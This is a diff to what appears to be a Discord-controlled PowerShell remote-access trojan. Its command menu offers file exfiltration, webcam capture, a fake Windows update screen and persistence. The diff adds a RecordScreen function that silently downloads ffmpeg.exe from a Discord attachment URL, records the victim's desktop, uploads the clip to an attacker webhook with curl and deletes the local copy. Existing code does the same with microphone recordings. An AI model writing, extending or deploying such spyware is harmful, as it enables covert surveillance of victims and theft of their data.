@@ -61,7 +61,8 @@ $msgsys = "``========================================================
 = Exfiltrate : Send various files. (see ExtraInfo)     =
 = Upload : Upload a file. (see ExtraInfo)              =
 = Systeminfo : Send System info as text file.          =
-= RecordAudio  : Record microphone to Discord         =
+= RecordAudio  : Record microphone to Discord          =
+= RecordScreen  : Record Screen to Discord             =
 = TakePicture : Send a webcam picture.                 =
 = FolderTree : Save folder trees to file and send.     =
 = FakeUpdate : Spoof windows update screen.            =
@@ -106,8 +107,9 @@ $msgsys = "``=========  Exfiltrate Command Examples ==================
 This Eg. will scan 192.168.1.1 to 192.168.1.254         =
 ==================  Message Example =====================
 ( Message 'Your Message Here!' )                        =
-================== Record-Audio Example =================
-( RecordAudio -t 100 ) number of seconds to record     =
+================== Record Examples ======================
+( RecordAudio -t 100 ) number of seconds to record      =
+( RecordScreen -t 100 ) number of seconds to record     =
 =========================================================``"
 $escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = "$escmsgsys"} | ConvertTo-Json
@@ -248,6 +250,24 @@ if ($t.Length -eq 0){$t = 10}
 curl.exe -F file1=@"$mp3Path" $hookurl | Out-Null
 sleep 1
 rm -Path $mp3Path -Force
+}
+
+Function RecordScreen{
+param ([int[]]$t)
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"} | ConvertTo-Json
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+$Path = "$env:Temp\ffmpeg.exe"
+If (!(Test-Path $Path)){  
+$url = "https://cdn.discordapp.com/attachments/803285521908236328/1089995848223555764/ffmpeg.exe"
+iwr -Uri $url -OutFile $Path
+}
+sleep 1
+$mkvPath = "$env:Temp\ScreenClip.mkv"
+if ($t.Length -eq 0){$t = 10}
+.$env:Temp\ffmpeg.exe -f gdigrab -t 10 -framerate 30 -i desktop $mkvPath
+curl.exe -F file1=@"$mkvPath" $hookurl | Out-Null
+sleep 1
+rm -Path $mkvPath -Force
 }
 
 Function AddPersistance{
